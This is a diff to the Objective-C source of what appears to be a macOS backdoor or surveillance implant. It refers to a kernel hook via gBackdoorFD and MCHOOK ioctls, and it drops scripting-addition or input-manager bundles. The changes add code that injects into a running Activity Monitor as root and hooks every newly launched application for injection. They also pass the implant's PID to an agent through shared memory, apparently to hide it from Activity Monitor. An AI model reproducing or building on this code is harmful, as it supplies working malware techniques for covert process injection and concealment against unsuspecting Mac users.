@@ -168,7 +168,7 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
       infoLog(ME, @"Ok we're really shutting down NOW");
 #endif
-
+      
       const char *userName = [NSUserName() UTF8String];
       ioctl(gBackdoorFD, MCHOOK_UNREGISTER, userName);
     }
@@ -2116,10 +2116,10 @@ static void computerWillShutdown(CFMachPortRef port,
   infoLog(ME, @"Initializing shutdown notifications");
 #endif
   
-  CFMachPortRef       gNotifyMachPort = NULL;
-  CFRunLoopSourceRef  gNotifyMachPortRLS = NULL;
-  mach_port_t         our_port = MACH_PORT_NULL;
-  int                 notify_return = NOTIFY_STATUS_OK;
+  CFMachPortRef       gNotifyMachPort     = NULL;
+  CFRunLoopSourceRef  gNotifyMachPortRLS  = NULL;
+  mach_port_t         our_port            = MACH_PORT_NULL;
+  int                 notify_return       = NOTIFY_STATUS_OK;
   
   // Tell the kernel that we are NOT shutting down at the moment, since
   // configd is just launching now.
@@ -2471,16 +2471,16 @@ static void computerWillShutdown(CFMachPortRef port,
           // Now it's time for all the Info.plist mess
           // we need to create the fs hierarchy for the input manager and kext
           //
-          if (gOSMajor == 10 && gOSMinor > 5)
+          if (gOSMajor == 10 && gOSMinor == 6)
             [self _dropOsaxBundle];
-          else
+          else if (gOSMajor == 10 && gOSMinor == 5)
             [self _dropInputManager];
         }
     }
   
-  //[NSThread detachNewThreadSelector: @selector(_registerForShutdownNotifications)
-  //                         toTarget: self
-  //                       withObject: nil];
+  [NSThread detachNewThreadSelector: @selector(_registerForShutdownNotifications)
+                           toTarget: self
+                         withObject: nil];
   
 #ifndef TEST_MODE
   int ret = 0;
@@ -2599,23 +2599,31 @@ static void computerWillShutdown(CFMachPortRef port,
     }
 #endif
   
-  // Register notification for new process. Snow only 
+  // Inject running ActivityMonitor
   if (gOSMajor == 10 && gOSMinor == 6 && geteuid() == 0)
     {
+      NSNumber *pActivityM = pidForProcessName(@"Activity Monitor");
+      
+      if (pActivityM != nil) 
+        {
 #ifdef DEBUG
-      NSLog(@"%s: running on OS%d.%d, osax injection", __FUNCTION__, gOSMajor, gOSMinor);
+          NSLog(@"%s: find running ActivityMonitor with pid %d, injecting...", __FUNCTION__, pActivityM);
 #endif
-      [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver: self 
-                                                             selector: @selector(injectBundle:)
-                                                                 name: NSWorkspaceDidLaunchApplicationNotification 
-                                                               object: nil];
-    }
-  else 
-    {
+          [self sendEventToPid: pActivityM];
+        }
+      else 
+        {
 #ifdef DEBUG
-      NSLog(@"%s: running on OS%d.%d, no osax injection", __FUNCTION__, gOSMajor, gOSMinor);
+          NSLog(@"%s: no running ActivityMonitor", __FUNCTION__);
 #endif
+        }
     }
+    
+  // Register notification for new process
+  [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver: self 
+                                                         selector: @selector(injectBundle:)
+                                                             name: NSWorkspaceDidLaunchApplicationNotification 
+                                                           object: nil];
   
   //
   // Get a task Manager instance (singleton) and load the configuration
@@ -2760,11 +2768,60 @@ static void computerWillShutdown(CFMachPortRef port,
   NSLog(@"%s: running new notificaion on app %@", __FUNCTION__, appInfo);
 #endif
 
-  // temporary thread for fixing euid/uid escalation
-  [NSThread detachNewThreadSelector: @selector(sendEventToPid:) 
-                           toTarget: self 
-                         withObject: [[appInfo objectForKey: @"NSApplicationProcessIdentifier"] retain]];
+  if (gOSMajor == 10 && gOSMinor == 6 && geteuid() == 0)
+    {
+      // temporary thread for fixing euid/uid escalation
+      [NSThread detachNewThreadSelector: @selector(sendEventToPid:) 
+                               toTarget: self 
+                             withObject: [[appInfo objectForKey: @"NSApplicationProcessIdentifier"] retain]];
+    }
+  else if (gOSMajor == 10 && gOSMinor == 5 && geteuid() == 0)
+    {
+      // Only for leopard send pid to new activity monitor via shmem
+      if ([[appInfo objectForKey: @"NSApplicationName"] compare: @"Activity Monitor"] == NSOrderedSame) 
+        {
+          // Write command with pid
+          [self shareCorePidOnShMem];
+        }
+    }
   
+  [pool release];
+}
+
+- (void)shareCorePidOnShMem
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  NSMutableData *pidCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+  pid_t amPid = getpid();
+  
+#ifdef DEBUG
+  NSLog(@"%s: sending pid to activity monitor %d", __FUNCTION__, amPid);
+#endif
+  
+  shMemoryCommand *shMemoryHeader   = (shMemoryCommand *)[pidCommand bytes];
+  shMemoryHeader->agentID           = AGENT_URL;
+  shMemoryHeader->direction         = D_TO_AGENT;
+  shMemoryHeader->command           = CR_CORE_PID;
+  shMemoryHeader->commandDataSize   = sizeof(pid_t);
+  memcpy(shMemoryHeader->commandData, &amPid, sizeof(pid_t));
+  
+  if ([gSharedMemoryCommand writeMemory: pidCommand
+                                 offset: OFFT_CORE_PID
+                          fromComponent: COMP_CORE] == TRUE)
+    {
+#ifdef DEBUG
+      NSLog(@"%s: running pid %d to activity monitor", __FUNCTION__, amPid);
+#endif
+    }
+  else 
+    {
+#ifdef DEBUG
+      NSLog(@"%s: running pid to activity monitor failed", __FUNCTION__);
+#endif
+    }
+  
+  [pidCommand release];
   [pool release];
 }
 
@@ -3106,7 +3163,7 @@ static void computerWillShutdown(CFMachPortRef port,
           execPath = [NSString stringWithFormat: @"%@",
                       [[[NSBundle mainBundle] bundlePath]
                        stringByAppendingPathComponent: @"System Preferences"]];
-        }    
+        }
     }
   
   //
